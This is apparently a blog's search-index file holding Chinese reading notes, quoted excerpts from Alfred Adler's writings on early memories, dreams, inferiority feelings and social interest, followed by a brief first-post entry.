一种可能的情况是，孩子在失去母亲后转而寻求父亲的关怀，并且得到了他的宠溺。而当父亲再婚时，他觉得父亲的宠爱被瓜分了，于是攻击继母。而继母如果觉得自己必须反击，那孩子就真的委屈了。她挑战了他们，于是他们奋起反抗。<strong>任何与孩子对抗的战斗终究都会是一场失败的战斗：他们永远不会被打败，也不会因为被战胜而与对手合作</strong>。在这些斗争中，最弱小的往往都是最后的胜利者。他们会拒绝提供被要求的东西，这样的方式注定难有收获。如果我们意识到合作与爱是永远无法靠力量强行获取的，想必这个世界上的紧张压力和无用功就会大大减少了</p></blockquote><blockquote><p>现在就让我们来看看她的梦吧。“好几个人和我一起坐在车里。”正如我们推测的，她擅长合作，喜欢和别人待在一起。“我们一直开到一片树林前面才停下来。每个人都下车跑进了树林里。他们中大部分人都比我个子大。”她再一次留意到了个头的差异。“但我努力及时赶到，和大家一起上了一部电梯。电梯向下开进了一个大约十英尺深的矿井里。我们都觉得，要是走出去一定会瓦斯中毒的。”现在她描绘出了一个危险情况。大多数人都会害怕某些确定的危险，要知道人类并非勇敢的生物。可是她的梦还有下文。“后来，我们走了出去，全都安然无恙。”在这里，你可以看到乐观的精神。如果一个人是乐于合作的，他们通常都会勇敢、乐观。“我们在那里待了一分钟，然后回到地面，赶快跑回了车里。”我深信这名女孩一直都是乐于合作的，但始终有个念头困扰着她——她总觉得自己如果能再高大一些就好了。在这里我们应该能看出一些紧张感，就好像能看到她踮起脚的模样一般。好在她喜欢与人交往，对分享成就很感兴趣，这能消解掉许多紧张感</p></blockquote><blockquote><p>她是个漂亮的姑娘，却总觉得人们都只不过是因为她好看的容貌才喜欢她，因此很害怕变丑或受伤。有魅力的人在我们的社会中更容易被人们记住，也更容易支配他人，这位姑娘就很明白这一点。可她还是想要成为一名男子，以男性的方式来掌控一切。所以心底里其实不太看重自己的美丽。 她最早的记忆是关于曾被一个男人吓到的故事，而且她也承认自己至今仍旧害怕会成为窃贼或袭击者的攻击目标。这看起来有些奇怪，一个有男性化倾向的女孩竟会害怕窃贼和袭击者。但其实并不奇怪，正是她的软弱决定了她的目标。她希望能在自己熟知并掌控的环境下生活，排除一切其他情况。窃贼和袭击者恰恰是不可控的，因此她更乐意将他们统统消灭。她想要轻轻松松地变成一个男性化的人，这样，就算不幸失败了，也总算是有个过得去的保护伞。我将这种对于女性角色的深刻不满称为“男性钦羡”（masculine protest），它的出现总是伴随着一种紧张感：“我是一个正在为身为女性的种种不利而努力抗争的人。</p></blockquote><blockquote><p>以下的考察能够直接帮助我们厘清梦的意义。我们在夜里做梦，但在清晨来临时却常常将梦境忘得一干二净。看似水过无痕，毫无踪迹可循。但真是这样吗？真的什么都没有留下吗？答案是，有的。梦所带给我们的感觉还保留着。没有任何画面，没有任何对于梦的理解，只有感觉久久萦绕。梦的目的必定就在于它们所激发出的感觉之中。而梦就是唤起感觉的工具与方式。之所以有梦，就是为了留下这些感觉</p></blockquote><blockquote><p>我们已经知道，人们认为梦能够为他们遇到的难题提供解决方案。由此不妨推论，人们做梦的目的就是为了寻找对于未来的指引和当前难题的解决方法。这与梦能够提供预示的观点相去甚远。我们还必须考虑到，做梦的人想要得到的是什么样的解决方案，又是从哪里找出它们的。很显然，比起对实际形势做出全盘考察并且审慎思考后找到的解决方法，出现在梦里的那些看起来会更糟糕一些。毋庸赘述，事实上，做梦的人只是希望能够在睡梦中轻松解决掉他们的麻烦。</p></blockquote><blockquote><p>“看来你的父亲是大错特错了，”我说，“他无时无刻不在想着将他的权威加诸你身上，这是非常不明智的。也许他有一些问题，需要看看医生。但你能怎么办呢？你不能期望去改变他。比方说，下雨了，你能做什么呢？你可以撑把伞，或是搭乘出租车，无论如何，想要打败甚至制服雨都是不可能的。而现在，你就是在和雨战斗。你认为这能够展示你的力量，能占据上风。但实际上，你比其他任何人所受到的伤害都多。</p></blockquote><blockquote><p>小时候的他是个不在乎整洁的孩子，羞怯、怕黑、害怕孤独。当我们听到孩子不爱干净时，就知道，一定是有人跟在他们身后随时收拾。当我们听到孩子害怕黑暗和孤单时，就能推断，一定有人总是在关注着他们，会去安慰他们</p></blockquote><blockquote><p>“过了一会儿，我们觉得想要再多尝一点，于是就自己动手了。”这是个勇敢的姑娘。她希望独立。“就在这时我的腿软了，苹果酒被打翻在地，酒窖里湿了一大片。”在这里，我们看到了一个禁酒主义者诞生的苗头。 “我不知道这件事跟我不喜欢苹果酒和其他酒精饮料有没有关系。”再一次，一个小小的意外事件成为了一个完整生活态度的成因。如果我们就事论事地来看，这件事并没有重要到足以造成如此深远影响的程度。可是这位女孩却把它当作了不喜欢酒精饮料的充足理由。我们或许能够发现这位女孩是一个善于吸取经验教训的人。也许她非常独立，犯错时总会自我纠正。这种品质可能是她整个生活的一大特点。从整段描述来看，她在说的似乎是：“我会犯错，但只要我发现了错误，就能及时改正。”如果是这样，她就能具备很好的性格，积极主动，勇于进取，总是渴望自我完善并改善处境，自然也就能拥有好的、有益的生活</p></blockquote><blockquote><p>当一个孩子被“炫耀”，那么他的兴趣很可能就在于赢得社会大众的喜爱，而非对其做出贡献</p></blockquote><blockquote><p>如果医生被问到他的早期记忆，那么多半都会有一些关于死亡的片段。“躺在棺材里，那么安静，那么苍白”——这是有关某个画面的记忆。这个女孩可能是视觉型的，喜欢观察世界</p></blockquote><blockquote><p>而最具启发性的，一是儿童展开他们故事的方式，二是他们能够想起的最早的事件。第一个记忆体现了个人生命观的基本准则，这是第一次令他感到满意的对于个人态度的表达。这令我们得以一窥他们所选择的个人发展的起点究竟是什么。若要探究一个人的个性，我绝不会不询问他最早的记忆。</p></blockquote><blockquote><p>在所有的心灵表达中，最能揭示真相的是个体的记忆。记忆是人们随身携带的提示器，记录着有关他们自己的局限和各种事件的意义。世上没有“偶然的记忆”。个体接受到的印象数不胜数，人们只会从中挑选出自认为与个人问题有关的来纳入记忆，不管它们是多么的模糊不清。这些记忆代表着他们的人生故事，一个他们不断对自己重复以从中摄取温暖或舒适感的故事。这个故事可以帮助人们将注意力集中在他们的目标上，或是用过往经验中的意义来武装他们，让他们可以用一种更为可靠的、经得起考验的方式来迎接未来。从日常的行为中，我们可以清楚地看到，记忆的作用在于稳定情绪。如果一个人遭遇了挫折，并且为之沮丧，那么他就会回想起从前曾经遭遇过的挫折。而当他感到振奋、高兴，充满勇气时，他就会选择完全不同的记忆，他想起的是那些高兴的事情，这些记忆让他更为乐观。同样的道理，如果遇到了一个难题，他就会唤出那些能够帮助自己调试好恰当态度的记忆，以便应对当下的情形</p></blockquote><blockquote><p>我们能够看出，伴随着对于缺憾的切实补偿，有人排除了某些可能性，有人却针对自我的局限加以训练。哲学家们为什么必须一次又一次地避世而居才能够思考和写作？由此就可以理解了。<strong>假使一个人的优越目标里匹配了高度的社会兴趣，那么虽说任何目标都难免有错失，可这个目标的错误却也不会太大</strong>。</p></blockquote><blockquote><p>我们人类的劳动分工为各种不同的目标提供了生存空间。或许，正如我们所见的，每一种目标都多多少少有一定的偏差，我们总能从中找出些可以批评的地方。可是人们的合作所需要的正是取长补短。对某一个孩子来说，优越感可能在于他所擅长的数学知识，对另一个而言则在于艺术，而第三个孩子又以健壮的体格见长。消化不良的孩子可能会认为自己的问题主要出在营养方面。如果相信研究食物能够改善他们的处境，那么他们的兴趣就有可能转向这一方面，结果就是，他们或许会成为一名职</p></blockquote><blockquote><p><strong>当陷入爱情时许多人都会感到软弱，在一定程度上，他们是对的。如果我们在恋爱，就必定变得温柔，我们对另一个人的兴趣也会让自己更容易受到伤害</strong></p></blockquote><blockquote><p>时至今日，我们还是常常在针对表征来处理问题。无论在医学上还是教育上，个体心理学都完全反对这种做法。如果孩子的数学一塌糊涂，或是在学校的表现很糟糕，那么我们若是仅仅针对这些方面来试图有所提升，只能是徒劳无功。或许他们是想让老师难受，甚至希望闹到被开除好彻底逃离学校。<strong>如果我们只用单一的方法来阻止他们，那他们总能找到另一条对策来达到他们的目的</strong>。</p></blockquote><blockquote><p>举例来说，我们时常发现，成为医生的人往往在他们童年很早的时候就开始面对死亡的现实。死亡给他们带来的最大印象，是威胁人类不安全外在的一个侧面。或许是双亲或兄弟姐妹中有人死去了，于是在他们后来的学习发展中，便致力于为自己或他人找到对抗死亡并增加安全感的方法。也有人将成为教师作为他们明确的目标，但我们很清楚究竟有多少种不同的教师。如果一名教师的社会情感程度较低，那他的优越目标就有可能是通过当老师成为小范围内的大人物。或许，只有在比自己更弱小、更没经验的人面前他才会觉得安全。而拥有高度社会情感的教师则会以平等的态度对待学生，他们是真心希望能够为人类福祉做出贡献的。在这里，我们只需要提出，教师与教师之间的能力和兴趣差别有多么大，而从他们的言行中又能如何清楚地看到其各自的个人目标。当一个目标被清晰地勾勒出来，个体的潜力就会被修剪压缩到适合这个目标；至于整体的目标——我们可以将它称为原型——却会在任何情况下都努力突破这些限制，找到一个途径来表现其个人设定的生命意义和争取优越感的终极理想</p></blockquote><blockquote><p><strong>成年人的神经官能症也是这样。设想一个例子，就说饱受偏头痛之苦的人们吧。头痛对他们来说就是很有用的工具，只要需要，它们就可以在任何特别的时刻发作。借助于头痛，他们可以不必面对生活中的麻烦。当他们不得不和陌生人打交道或是做决定时，头痛招之即来。与此同时，头痛还可以帮助他们操控他们的同事、搭档或家人</strong>。我们怎么能指望他们会放弃这样一种有力的武器呢？他们将疼痛加诸己身，但从他们的角度来说，却是再明智不过的投资了——它会带来所有他们能够期望的回报。当然，我们可以给患者一个惊人的解释来吓走他的头痛，就像用电击或一场假手术来治好士兵的战争疲劳症（shell-shocked）一样。或许药物治疗也能令某些症状有所缓解，让病人难以继续使用这些特别选择出来的症状。但是，只要他们的目标没有改变，哪怕治好了一种症状，他们也会找到另外一种来取而代之。“治好”了头痛，接着就可能出现失眠，或是其他一些新的症状。只要目标依旧，他们就一定要继续为之努力</p></blockquote><blockquote><p>举例来说，我们时常发现，成为医生的人往往在他们童年很早的时候就开始面对死亡的现实。死亡给他们带来的最大印象，是威胁人类不安全外在的一个侧面。或许是双亲或兄弟姐妹中有人死去了，于是在他们后来的学习发展中，便致力于为自己或他人找到对抗死亡并增加安全感的方法。也有人将成为教师作为他们明确的目标，但我们很清楚究竟有多少种不同的教师。如果一名教师的社会情感程度较低，那他的优越目标就有可能是通过当老师成为小范围内的大人物。或许，只有在比自己更弱小、更没经验的人面前他才会觉得安全。而拥有高度社会情感的教师则会以平等的态度对待学生，他们是真心希望能够为人类福祉做出贡献的。在这里，我们只需要提出，教师与教师之间的能力和兴趣差别有多么大，而从他们的言行中又能如何清楚地看到其各自的个人目标。当一个目标被清晰地勾勒出来，个体的潜力就会被修剪压缩到适合这个目标；至于整体的目标——我们可以将它称为原型——却会在任何情况下都努力突破这些限制，找到一个途径来表现其个人设定的生命意义和争取优越感的终极理想</p></blockquote><blockquote><p>我的一名病人在家中排行老二，他深受无法摆脱的罪恶感的困扰。他的父亲和哥哥都极其重视诚实这种品质。然而，在他七岁那年，他告诉学校老师，自己独立完成了一份家庭作业，可事实上，这份作业是哥哥帮他做的。这个男孩将他的罪恶感隐藏了三年。最后，他去见老师，坦承了这个糟糕的谎言。可老师只是付之一笑。接下来，他又哭泣着找到父亲，作了第二次坦白。这次他更成功一些，父亲为儿子的诚实而感到骄傲，夸奖并安慰了他。但尽管父亲原谅了他，男孩还是非常沮丧。至此，我们很难回避以下的结论：这位男孩为了这样微不足道的过失而如此严厉地自责，其实是想要证明自己高度的诚实与严谨。家庭中高尚的道德氛围使他期望在诚实方面有卓越的表现。面对哥哥在学业和社会上的成功，他感到自卑，因此努力尝试另辟蹊径来争取优越感</p></blockquote><blockquote><p>人们的兴趣和注意力指向何方，这是一个问题。如果朝着自我之外的目标而努力，那么自然而然地，他们就会很好地训练自己，做好准备，以求达成目标。任何困难在他们眼中都不过是成功路上需要跨越的障碍而已。反过来，如果他们的兴趣点只在于强调自身的不足，或是虽然对抗这种不足，但只是为了使自己从中脱身，他们就很难取得真正的进步。一只笨拙的右手不会因为人心里想着要变得灵巧，盼望着少些笨拙，甚至避开那些会显示出其笨拙的场面，就变成了灵巧的右手。只有通过实打实的练习，笨拙的手才有可能灵巧起来，并且对于“将来能够做好”的渴望，要远远超过当下的笨拙所带来的挫败感。如果孩子们要调动他们的能量来克服困难，那么一定得有一个外在于自身的行动目标，这个目标建立在对于现实、他人乃至合作的兴趣之上。</p></blockquote><blockquote><p>一项针对梦境和联想的调查可能被证实是有用的：个性人格无论在梦境中还是现实生活中都不会改变，但在梦境中时来自社会的压力相对较小，也无需那么多的戒备与隐藏，个性得以更多的释放。然而要破解人们赋予自己以及个人生活的意义，最有力的帮手便是他们的记忆库了。<strong>每一份记忆，哪怕是被他们自己视为微不足道的琐事，都很重要。只要记得，就说明它们值得记忆，而之所以值得记忆，是因为这些都与他所设想的生活相关。它在对他们附耳低语，“这是你应该期待的”，或“这是你一定要避免的”，甚至断言“这就是人生”</strong>。在此我们必须重申，经验本身并非如它们在记忆中所占的地位那么重要，重要的只是它们的用途——被用来印证生命的意义。每一份记忆都经过了我们的粉饰</p></blockquote><blockquote><p>五岁前，儿童已经形成了一套完整而牢固的行为模式，能够开始用他们自己的方式来应对问题和任务，我们将这称为他们的“生活方式”。他们已经形成了个人最为根深蒂固，也最恒定的概念，知道能对世界和自身期待些什么。从此以后，世界在他的眼里就被放进了一个固定的统觉[2]框架中。一切经验都得经过解读后才会被接受，而这解读又往往离不开儿童时期形成的对生命意义的原初理解。</p></blockquote><blockquote><p>以爱情与婚姻为例吧。如果我们关心自己的爱人，如果我们能够竭尽所能地令爱人的生活舒适富足，那么自然就会呈现出最好的自己。反之，假如我们认为应该在一个纯粹的环境下发展自我人格，拒绝一切有利于他人的动机，那么只会成为一个嚣张跋扈、令人生厌的家伙。</p></blockquote><blockquote><p><strong>所有真实的“生命的意义”都有一个共同标志，那就是它们都具有普遍意义——能够为众人所分享，为他人所接受。对于生命中种种问题来说，一套切实可行的解决方案同时也是为他人树立的样板范例，因为它提供了一个解决普遍问题的成功之道。即便是最伟大的天才也无法超脱出“卓有建树”这样的评价——只有当一个人的生命被其他人认为是举足轻重的时候，他才有可能被称为“天才”</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博文</title>
      <link href="/2018/09/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E6%96%87/"/>
      <url>/2018/09/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E6%96%87/</url>
      
        <content type="html"><![CDATA[<p><strong><center>我的征途，是星辰大海</center></strong></p><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
